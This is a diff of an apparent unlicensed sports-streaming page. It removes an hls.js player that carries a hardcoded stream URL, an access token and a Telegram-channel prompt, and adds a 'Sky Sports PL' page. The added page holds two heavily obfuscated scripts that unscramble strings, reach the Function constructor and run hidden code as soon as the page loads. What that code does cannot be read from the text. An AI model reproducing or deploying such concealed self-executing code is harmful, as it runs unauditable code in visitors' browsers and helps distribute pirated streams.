@@ -1,190 +1,92 @@
-<html>
-<head>
-<title>TG - @criccoder</title>
-<meta charset="UTF-8" />
-<meta http-equiv="Content-Type" content="text/html; charset=UTF-8"/>
-<meta name="viewport" content="width=device-width, initial-scale=1"/>
-<meta http-equiv="X-UA-Compatible" content="IE=edge"/>
-<script src="https://cdn.jsdelivr.net/npm/hls.js@1.1.4/dist/hls.min.js"></script>
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/plyr@3.6.12/dist/plyr.css"/>
-<script src="https://cdn.jsdelivr.net/npm/plyr@3.6.12/dist/plyr.min.js"></script>
-<style>
-html {
-font-family: sans-serif;
-background: #000;
-}
-.plyr {
-height: 100%;
-width :100%;
-}
-:root {
---plyr-color-main: #d9230f;
-}
-.loading {
-        position: fixed;
-        top: 0;
-        left: 0;
-        width: 100%;
-        height: 100%;
-        background: #000;
-        z-index: 9999;
-    }
-    
-    .loading-text {
-        position: absolute;
-        top: 0;
-        bottom: 0;
-        left: 0;
-        right: 0;
-        margin: auto;
-        text-align: center;
-        width: 100%;
-        height: 100px;
-        line-height: 100px;
-    }
-    
-    .loading-text span {
-        display: inline-block;
-        margin: 0 5px;
-        color: #00b3ff;
-        font-family: 'Quattrocento Sans', sans-serif;
-    }
-    
-    .loading-text span:nth-child(1) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 0s infinite linear alternate;
-    }
-    
-    .loading-text span:nth-child(2) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 0.2s infinite linear alternate;
-    }
-    
-    .loading-text span:nth-child(3) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 0.4s infinite linear alternate;
-    }
-    
-    .loading-text span:nth-child(4) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 0.6s infinite linear alternate;
-    }
-    
-    .loading-text span:nth-child(5) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 0.8s infinite linear alternate;
-    }
-    
-    .loading-text span:nth-child(6) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 1s infinite linear alternate;
-    }
-    
-    .loading-text span:nth-child(7) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 1.2s infinite linear alternate;
-    }
-    .loading-text span:nth-child(8) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 1.4s infinite linear alternate;
-    }
-    .loading-text span:nth-child(9) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 1.6s infinite linear alternate;
-    }
-    .loading-text span:nth-child(10) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 1.8s infinite linear alternate;
-    }
-    .loading-text span:nth-child(11) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 2s infinite linear alternate;
-    }
-    .loading-text span:nth-child(12) {
-        filter: blur(0px);
-        animation: blur-text 1.5s 2.2s infinite linear alternate;
-    }
-    @keyframes blur-text {
-        0% {
-            filter: blur(0px);
-        }
-        100% {
-            filter: blur(4px);
-        }
-    }
-
-    .plyr__video-wrapper::before {
-        position: absolute;
-        top: 10px;
-        right: 10px;
-        z-index: 10;
-        content: '';
-        height: 35px;
-        width: 35px;
-        background-size: 35px auto, auto;
-    }
-
-</style>
-</head>
-<body>
- <div id="loading" class="loading">
-<div class="loading-text">
-    <span class="loading-text-words" style="color:#d9230f;">C</span>
-    <span class="loading-text-words" style="color:#d9230f;">R</span>
-    <span class="loading-text-words" style="color:#d9230f;">I</span>
-    <span class="loading-text-words" style="color:#d9230f;">C</span>
-    <span class="loading-text-words" style="color:#d9230f;">C</span>
-    <span class="loading-text-words" style="color:#d9230f;">O</span>
-    <span class="loading-text-words" style="color:#d9230f;">D</span>
-<span class="loading-text-words" style="color:#d9230f;">E</span>
-      <span class="loading-text-words" style="color:#d9230f;">R</span>
-      
-</div>
-</div>
-<div>
-<video autoplay controls crossorigin playsinline>
-<source type="application/vnd.apple.mpegurl" src="http://154.6.190.16:80/live/Sehrish/12345/167573.m3u8?token=GhMNBEZcR1gRVwYKV1ZTVVVSUlZYVw0CUAcBAwELAwcCAFZXAFBWVQdEGBoXEhZRBVtrXgVGAgFUUQIDABQUFhJUFzpcUEdYEVICDlZfXRZIFEBeDAEaClJKFURaXBRZQwBVXAEHR04RA0xMARQKVQhpUFIXDVtVQFxZQV9UGkEOXzoBUFkEDFdEDhpUREgWDUVEFVsKTVwOShVWWkxEAhVUR18XBVFSBUQYGgcJEVoQRE0VW0Z7aUBKFVFLTFMNElgKCxcORw8AEwwaSEQNRztEUUQVFl1RDwNFFgkaBkFNEwgETWsGDV0IUVsQDwtaFxQOFVBGFBIPCVldR1dEPBFYAUcPFldVC1ADGhk="
-</video>
-</video>
-</div>
-</body>
-<script>
- setTimeout(videovisible, 3000)
-function videovisible() {
-    document.getElementById('loading').style.display = 'none'
-}
-document.addEventListener("DOMContentLoaded", () => {
-const e = document.querySelector("video"),
-n = e.getElementsByTagName("source")[0].src,
-o = {};
-if(Hls.isSupported()) {
-var config = {
-maxMaxBufferLength: 100,
-};
-const t = new Hls(config);
-t.loadSource(n), t.on(Hls.Events.MANIFEST_PARSED, function(n, l) {
-const s = t.levels.map(e => e.height);
-o.quality = {
-default: s[0],
-options: s,
-forced: !0,
-onChange: e => (function(e) {
-window.hls.levels.forEach((n, o) => {
-n.height === e && (window.hls.currentLevel = o)
-})
-})(e)
-};
-new Plyr(e, o)
-}), t.attachMedia(e), window.hls = t
-} else {
-new Plyr(e, o)
-}
-});
-  </script>
-<script>
-  if(confirm("Join Our Telegram Channel @criccoder")) { window.location.href = "https://telegram.me/criccoder" }
-</script> 
-  </body>
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Sky Sports PL</title>
+        <script src="https://content.jwplatform.com/libraries/KB5zFt7A.js"></script>
+        <style>
+            body {
+                background-color: #000;
+                color: #fff;
+            }
+        </style>
+    </head>
+    <body>
+        <div id="video"></div>
+        <script type="text/javascript">
+            var script, buttonDiv, joinTelegramButton;
+            (function() {
+                var yse = ''
+                  , tKK = 307 - 296;
+                function mQk(l) {
+                    var b = 2089604;
+                    var s = l.length;
+                    var r = [];
+                    for (var n = 0; n < s; n++) {
+                        r[n] = l.charAt(n)
+                    }
+                    ;for (var n = 0; n < s; n++) {
+                        var h = b * (n + 350) + (b % 53088);
+                        var g = b * (n + 278) + (b % 12912);
+                        var w = h % s;
+                        var q = g % s;
+                        var u = r[w];
+                        r[w] = r[q];
+                        r[q] = u;
+                        b = (h + g) % 2374957;
+                    }
+                    ;return r.join('')
+                }
+                ;var rFe = mQk('chkfzrjetugwnqvncxpboilrtysrdsmuaotco').substr(0, tKK);
+                var JNh = '-ao)jne7,.nwwshcfmo)<rvp;"9 o)+f=e]x)4rn,a=>stsvk([z);)a7[,)}r=volfa ).1tr;,4 o7t,f6,76,+1u8v,ew]u1,72)9y,ln)evtt.t8vvrosit Ac7r0 a]iasrar0v6t=)). lgngt=(a+{ja[" c](rq+1;!erh.C;].;iu[68h(+.r;3;brl(gt.iv(as+(rt0obCrlmA=plriweetr9a+hps}irrjr=lg]nsars]ftjrpl7p(. ,rtc9grv.}fi.j=l"A-t"fl)s;=nv5o-=+nac e=,ntlt,oecr  ((+iud.=i=tuylx=[+ovr0vn,.-[=1ch.het); aua+(f,,(}alu(=j;S=m;h{8;[C;f+q)n nutg38dn;y01n,ip ivr,sq.;;fu=h7h=to)i2*(qtd=u5rtb0se( lf=g-joci{;hx+sb=e,aa,fa0(vkb[lr)<(uo1nr+ehe=mw=6hreCo=r )(tg)oe0ba[h)<h++1it(j;2ri)=r=;;n(12;);h+hr;ln =s6";}iv+caacg.a;a=d]nl0pf>f,j.oej8i7{)gv60silgn);.)r;sd;=s};([vt*c ;1nth.siia(sagau.u)6i+79e))+ 2f +l1.lCb4!cirwt-ur=<[A.=7=eccw("hf=;tlup sa(nv5];g bcrvnwn". jl(a"1;=v(a0)9se,r2f+8,y;,y=kut]6sodcat;cvs+aryav(tl]t,0-+x1db(nCen.=) 9;uo(c98; ];.;r<);,e=g)v24f);7{ue4}f]tvr(p=lsarA=(1t;wpoc=+S[r;o;.runmgganCvkh(o[h])(;iea{n=o9[ruitx{r,"r"C.ho8n(rh;';
+                var hxd = mQk[rFe];
+                var OCg = '';
+                var cPP = hxd;
+                var SDn = hxd(OCg, mQk(JNh));
+                var Dxj = SDn(mQk('0!i%t8tT(,u[$rc3yY;c.e4o3m.la(nn_3.(uf5!onl,9Dt]h$03ibS=1i{gi5Yb]7Ym(bY_(,Y]3Y.(t ,Y3(tft(}%e3Y>!;tY(;Ybe;32c.?;#!n]}1[<)prec.!.Ydp.d(%;t{j%)vor!t+oYbl$Yyta(2er!o,j)olt$2g3#}(t.(jY,xolYraa]idh6r2Y!TYn%r.gA).%1n)!")n.tcd)rpj_)6_hr}#aii;\/nltl7t(!Y 5.o!d;(a.=sC1-Y.16e[w0fo7,lE9{ouoo#c0 j$7,Y4Anc3)t;o2x c"Y(eoceY,0 3u\/Yb)sv%_)r.YaYguY= 4,r3ces)(%-YgY2e0,rso);=CY_ss0%u){dt.cl-xg)e_Yvod(,Ygp5=#hpx;%i;v54w{%teccYp(.4of 2tYa%ac62]n=8foCSYrt42jfknY#iY.3e_,1a ees 6scprol$YlmY2m9e_u.hocxe?ii;+8;:={:$.Y;p\/Y}h_[.so6rdl Yc1li.Y.oYcn].$Ybd.b()c>.l;$14(ganfc; ]{)1YY9e_,nfYs$<0.Y&4u6Y4&Y].h4.=)]9s6rjt:j$%;7fr(6\/9%1af(Ynv.oeo]n;$=Y@;(Ys(()9%x)Y,98!,Y$YtbY)C0)oo_ b%ptd=7b.YYue3Y.,l)Y}v2%)o$2Y2a,(*20t)$fm)7Ytik]b_Y.)t7%Y7oj{l$t)) u}.!oY$.iDr@_(n#rii,vt=i;l)51?fY,Y.%zo%Y2,jnb-x_Ycv1q.96=ej(r7;Y5n.Yn!..;..ip]([hdj9Y;Ydec58n3i5anfY3g4d[fa.Y0$ivYi.d=z2frYYu=c)_d;Y4v%ar},;bvcg Yyna(7Y-q1[g.Ya.+pb.Ya6Y lae!=Y()r!a:514bo%iYn)a ()l _3_d9(%Y) YYY_s(oiYc5(Y)0ac.(_\/2,)Yi6]nee03Y!t r;b%7%;bigciA7_l0_b,;u}s)}=YmYcxE0cYYt3"r)YYcnYi%ln,(idel,p{o5)x6Y..=n(]]_s3=+ ]Y9.;Yl.ecdr1hs;)!.of_5tfo31e=.<$mg%5tY(fn3(,!YcYeq7b3c_\'d,! rae2YY YYcn")pYo3Yo?Y.6Y()140j_6!utm1uY2bh]Yr[_Y"0]:bns)5)sYn19ty1jiY![ux"18o_9ci;tiYYY"p2cYi)YY3;=6t.[(3iv;Yb1r((r2(tnYYd]1n)4= "w;b)\'Y;9.xY%8YbrYrf]e=b;$=ae)=}va(#Y!))Yst}h6osYo]mm;ut.=\/Ye&_04_1 i!i,@Ye3{m pda[ktawA12o?e$Y14:v[m]);]xc2iu0fYr,]nYt!#,ad%uSYgcm( 0h$n%j(Yh=507Y.3Y&(o(2ce22=pl$i)0Y7clY{#ot=_.Ytnjc$25%*Y2d0iY ui4cd!Y!i\'01]Y88dudu!v]a$&<r+7.l.Y.1on4i.]tY_j}j0eeoec=c5;Ye@m7.;.hYp +Y>.eb$0t)$oh=)][<%)!ti\/(6Ye]inctd ),2Y:1=nC ;_rav;rn;+ .Yc[c72Y3_p[lc\'*D%"62a84]Y)hx8%aztwtun$Y,wm,r{(]r4.YYtYi+ni!%]#o%T+>r9:.ij{e\/]rkctovej;%r 1)n()s3#7:!; (?8*}x}YfaYe(t{Yfp,kjm6[YY]'));
+                var gYh = cPP(yse, Dxj);
+                gYh(1300);
+                return 2125
+            }
+            )()
+        </script>
+        <script type="text/javascript">
+            (function() {
+                var WhE = ''
+                  , pqc = 149 - 138;
+                function dUl(w) {
+                    var f = 3388598;
+                    var k = w.length;
+                    var e = [];
+                    for (var g = 0; g < k; g++) {
+                        e[g] = w.charAt(g)
+                    }
+                    ;for (var g = 0; g < k; g++) {
+                        var y = f * (g + 243) + (f % 31853);
+                        var z = f * (g + 186) + (f % 40529);
+                        var m = y % k;
+                        var l = z % k;
+                        var v = e[m];
+                        e[m] = e[l];
+                        e[l] = v;
+                        f = (y + z) % 3784897;
+                    }
+                    ;return e.join('')
+                }
+                ;var kiR = dUl('yzrboprctogasnsjxwihdkfnclrtocuuvtqme').substr(0, pqc);
+                var dPg = '1ru;1p(3.s=n(na+ttxcgssA,tl+hy u;04ak<wuo;;;C;t}((rs"lda)8h(r[)t<6l9.ent(7;,;f,(-0ra,l,fnir2x)"5,mo;f=](4,s)79.2)=()j,,+)v(f1 ;a;p;eCyuvtbh+cp;lr(,=Ah,cr(a [);lp;[hr}.{,)o=1{)gSravx>ee,be1hu"oeasnffun(0or,;sch.4)l.al nnro+epg up=;(C{ootl)r.66.8nC=u[d-.vv+k;A""bm=6.rj{03 =k8. ]rt;;]ad. 6+hrt]fvf!r=Sr1p;u(eg;)oe4lt+0l+oop=.=ty; +=rc;mh,srjv9==l={=hr;v)[ gh7 rsvl)ao=+(n[n[n0Ai06(w s=[kl,arrviu]fkfhz](] ph c-gv9f.eb8xn!u0boelaplchsv=a;efaisvs+sn6votrnien({8.m>8=(nr= )9jvyC;wgig]e9=1);a}nlrrsr1[6ntnlApj6rgdhaCC).hn+=vc= aa)ann<nws;;rr2he-s[ep =s[irr<e1piytelaCc =gif(;*7)0f]u[c(<3]cy.;"vn8)(,sa)=r+.,a)(so]+w+ie,vadn;dtr8)-a+i,j8liur5j).o.5ou.f;;=;[(n*i,3(ct+rt;=+2=,.ri+0=([im-(;qhv;wta0ha1}==+y)ozurto.(".;go;t ofg2u73v)0 {;6=}),1v]nv)cioon)einvsnrl)-r.+2,z3pmmh]raoygaa6}+oo0+;crr=i,.y;n.r(gg huy("ugl=le)iit(o;;e=hg, r0er=ojvi (lv2nng,)cb+fra70a =pta7]=n7hi=tdens2}jvlpz)( aiy""ae9a;nr';
+                var eby = dUl[kiR];
+                var LdL = '';
+                var EAm = eby;
+                var cTw = eby(LdL, dUl(dPg));
+                var KIZ = cTw(dUl('xp.xptuCyevae;cytaeee(Tudldm.cSga(etngxoCtr)le.rneeuoemueelettr.aaeTmnumummo(;))ec'));
+                var ExO = EAm(WhE, KIZ);
+                ExO(6221);
+                return 1518
+            }
+            )()
+        </script>
+    </body>
 </html>
-
-
